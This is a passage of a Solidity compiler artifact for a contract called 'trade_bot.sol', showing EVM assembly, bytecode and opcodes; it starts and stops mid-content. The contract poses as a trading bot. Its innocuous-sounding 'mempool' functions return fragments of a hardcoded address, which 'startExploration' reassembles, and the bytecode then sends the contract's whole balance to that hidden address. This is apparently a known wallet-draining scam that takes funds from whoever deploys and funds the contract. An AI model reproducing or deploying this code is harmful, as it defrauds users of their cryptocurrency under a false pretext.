\"trade_bot.sol\":3889:4058  if ((b1 >= 97) && (b1 <= 102)) {\r... */\n    tag_104:\n        /* \"trade_bot.sol\":4074:4076  97 */\n      0x61\n        /* \"trade_bot.sol\":4068:4070  b2 */\n      dup3\n        /* \"trade_bot.sol\":4068:4076  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4067:4092  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_110\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4088:4091  102 */\n      0x66\n        /* \"trade_bot.sol\":4082:4084  b2 */\n      dup3\n        /* \"trade_bot.sol\":4082:4091  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4067:4092  (b2 >= 97) && (b2 <= 102) */\n    tag_110:\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      iszero\n      tag_111\n      jumpi\n        /* \"trade_bot.sol\":4107:4109  87 */\n      0x57\n        /* \"trade_bot.sol\":4101:4109  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n      jump(tag_112)\n    tag_111:\n        /* \"trade_bot.sol\":4133:4135  65 */\n      0x41\n        /* \"trade_bot.sol\":4127:4129  b2 */\n      dup3\n        /* \"trade_bot.sol\":4127:4135  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4126:4150  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_113\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4147:4149  70 */\n      0x46\n        /* \"trade_bot.sol\":4141:4143  b2 */\n      dup3\n        /* \"trade_bot.sol\":4141:4149  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4126:4150  (b2 >= 65) && (b2 <= 70) */\n    tag_113:\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      iszero\n      tag_114\n      jumpi\n        /* \"trade_bot.sol\":4165:4167  55 */\n      0x37\n        /* \"trade_bot.sol\":4159:4167  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n      jump(tag_115)\n    tag_114:\n        /* \"trade_bot.sol\":4191:4193  48 */\n      0x30\n        /* \"trade_bot.sol\":4185:4187  b2 */\n      dup3\n        /* \"trade_bot.sol\":4185:4193  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"trade_bot.sol\":4184:4208  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_116\n      jumpi\n      pop\n        /* \"trade_bot.sol\":4205:4207  57 */\n      0x39\n        /* \"trade_bot.sol\":4199:4201  b2 */\n      dup3\n        /* \"trade_bot.sol\":4199:4207  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"trade_bot.sol\":4184:4208  (b2 >= 48) && (b2 <= 57) */\n    tag_116:\n        /* \"trade_bot.sol\":4180:4232  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n      iszero\n      tag_117\n      jumpi\n        /* \"trade_bot.sol\":4223:4225  48 */\n      0x30\n        /* \"trade_bot.sol\":4217:4225  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"trade_bot.sol\":4180:4232  if ((b2 >= 48) && (b2 <= 57)) {\r... */\n    tag_117:\n        /* \"trade_bot.sol\":4122:4232  if ((b2 >= 65) && (b2 <= 70)) {\r... */\n    tag_115:\n        /* \"trade_bot.sol\":4063:4232  if ((b2 >= 97) && (b2 <= 102)) {\r... */\n    tag_112:\n        /* \"trade_bot.sol\":4257:4259  b2 */\n      dup2\n        /* \"trade_bot.sol\":4252:4254  16 */\n      0x10\n        /* \"trade_bot.sol\":4247:4249  b1 */\n      dup5\n        /* \"trade_bot.sol\":4247:4254  b1 * 16 */\n      mul\n        /* \"trade_bot.sol\":4247:4259  b1 * 16 + b2 */\n      add\n        /* \"trade_bot.sol\":4237:4260  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"trade_bot.sol\":3792:3793  2 */\n      0x02\n        /* \"trade_bot.sol\":3787:3793  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"trade_bot.sol\":3754:4266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      jump(tag_97)\n    tag_98:\n      pop\n        /* \"trade_bot.sol\":4285:4290  iaddr */\n      dup3\n        /* \"trade_bot.sol\":4270:4291  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"trade_bot.sol\":3573:4296  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"trade_bot.sol\":4944:5031  function getBalance() private view returns(uint) {\r... */\n    tag_39:\n        /* \"trade_bot.sol\":4987:4991  uint */\n      0x00\n        /* \"trade_bot.sol\":5005:5026  address(this).balance */\n      selfbalance\n        /* \"trade_bot.sol\":4998:5026  return address(this).balance */\n      swap1\n      pop\n        /* \"trade_bot.sol\":4944:5031  function getBalance() private view returns(uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":6504:6591  function getMempoolShort() private pure returns (string memory) { \r... */\n    tag_46:\n        /* \"trade_bot.sol\":6553:6566  string memory */\n      0x60\n        /* \"trade_bot.sol\":6574:6586  return \"0xE\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x3078450000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":6504:6591  function getMempoolShort() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":3454:3567  function fetchMempoolEdition() private pure returns (string memory) { \r... */\n    tag_48:\n        /* \"trade_bot.sol\":3507:3520  string memory */\n      0x60\n        /* \"trade_bot.sol\":3528:3562  return \"AbDDF950357a2BD8c9642f30B\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x19\n      dup2\n      mstore\n      0x20\n      add\n      0x4162444446393530333537613242443863393634326633304200000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":3454:3567  function fetchMempoolEdition() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":2242:2341  function fetchMempoolVersion() private pure returns (string memory) { \r... */\n    tag_50:\n        /* \"trade_bot.sol\":2295:2308  string memory */\n      0x60\n        /* \"trade_bot.sol\":2316:2336  return \"39242040974\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0b\n      dup2\n      mstore\n      0x20\n      add\n      0x3339323432303430393734000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":2242:2341  function fetchMempoolVersion() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n        /* \"trade_bot.sol\":4852:4938  function getMempoolLong() private pure returns (string memory) { \r... */\n    tag_52:\n        /* \"trade_bot.sol\":4900:4913  string memory */\n      0x60\n        /* \"trade_bot.sol\":4921:4933  return \"C98\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x03\n      dup2\n      mstore\n      0x20\n      add\n      0x4339380000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"trade_bot.sol\":4852:4938  function getMempoolLong() private pure returns (string memory) { \r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a179cd3f9a43e88015e2ac7019a7f2fa71bb38a8bb86a1dbe1bacaccbd46397664736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610aaa806100616000396000f3fe60806040526004361061004e5760003560e01c80631b55ba3a1461005a57806370e44c6a146100715780638da5cb5b1461010157806395d89b4114610158578063bedf0f4a146101e857610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101ff565b005b34801561007d57600080fd5b5061008661026a565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100c65780820151818401526020810190506100ab565b50505050905090810190601f1680156100f35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561010d57600080fd5b50610116610472565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561016457600080fd5b5061016d610498565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101ad578082015181840152602081019050610192565b50505050905090810190601f1680156101da5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101f457600080fd5b506101fd610516565b005b600061021161020c610581565b61071f565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc61023a610978565b9081150290604051600060405180830381858888f19350505050158015610265573d6000803e3d6000fd5b505050565b6060600061027e610279610581565b61071f565b90506000819050606061028f610980565b9050606061029b6109bd565b905060606102a76109fa565b905060606102b3610a37565b90508473ffffffffffffffffffffffffffffffffffffffff166108fc6102d7610978565b9081150290604051600060405180830381858888f19350505050158015610302573d6000803e3d6000fd5b50838383836040516020018085805190602001908083835b6020831061033d578051825260208201915060208101905060208303925061031a565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061038e578051825260208201915060208101905060208303925061036b565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b602083106103df57805182526020820191506020810190506020830392506103bc565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b60208310610430578051825260208201915060208101905060208303925061040d565b6001836020036101000a038019825116818451168082178552505050505050905001945050505050604051602081830303815290604052965050505050505090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6060806104a36109bd565b9050806040516020018082805190602001908083835b602083106104dc57805182526020820191506020810190506020830392506104b9565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405160208183030381529060405291505090565b6000610528610523610581565b61071f565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc610551610978565b9081150290604051600060405180830381858888f1935050505015801561057c573d6000803e3d6000fd5b505050565b60608061058c610980565b905060606105986109bd565b905060606105a46109fa565b905060606105b0610a37565b9050838383836040516020018085805190602001908083835b602083106105ec57805182526020820191506020810190506020830392506105c9565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061063d578051825260208201915060208101905060208303925061061a565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b6020831061068e578051825260208201915060208101905060208303925061066b565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b602083106106df57805182526020820191506020810190506020830392506106bc565b6001836020036101000a03801982511681845116808217855250505050505090500194505050505060405160208183030381529060405294505050505090565b6000606082905060008090506000806000600290505b602a81101561096b576101008402935084818151811061075157fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061077357fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156107c4575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156107d45760578303925061086e565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610812575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156108225760378303925061086d565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610860575060398373ffffffffffffffffffffffffffffffffffffffff1611155b1561086c576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156108ac575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156108bc57605782039150610956565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156108fa575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561090a57603782039150610955565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610948575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610954576030820391505b5b5b81601084020184019350600281019050610735565b5082945050505050919050565b600047905090565b60606040518060400160405280600381526020017f3078450000000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280601981526020017f4162444446393530333537613242443863393634326633304200000000000000815250905090565b60606040518060400160405280600b81526020017f3339323432303430393734000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600381526020017f433938000000000000000000000000000000000000000000000000000000000081525090509056fea2646970667358221220a179cd3f9a43e88015e2ac7019a7f2fa71bb38a8bb86a1dbe1bacaccbd46397664736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0xAAA DUP1 PUSH2 0x61 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x71 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x101 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x158 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x1E8 JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1FF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x86 PUSH2 0x26A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xC6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF3 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x116 PUSH2 0x472 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x164 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH2 0x498 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1AD JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x192 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x1DA JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1FD PUSH2 0x516 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH2 0x211 PUSH2 0x20C PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x23A PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x265 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 PUSH2 0x27E PUSH2 0x279 PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP PUSH1 0x60 PUSH2 0x28F PUSH2 0x980 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x29B PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2A7 PUSH2 0x9FA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2B3 PUSH2 0xA37 JUMP JUMPDEST SWAP1 POP DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x2D7 PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x302 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP DUP4 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x33D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x31A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x38E JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x36B JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x3DF JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x3BC JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x430 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x40D JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP5 POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP7 POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4A3 PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x4DC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x4B9 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x528 PUSH2 0x523 PUSH2 0x581 JUMP JUMPDEST PUSH2 0x71F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x551 PUSH2 0x978 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x57C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x58C PUSH2 0x980 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x598 PUSH2 0x9BD JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A4 PUSH2 0x9FA JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5B0 PUSH2 0xA37 JUMP JUMPDEST SWAP1 POP DUP4 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP6 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x5EC JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x5C9 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP5 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x63D JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x61A JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP4 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x68E JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x66B JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x6DF JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x6BC JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP5 POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP5 POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x96B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x751 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x773 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C4 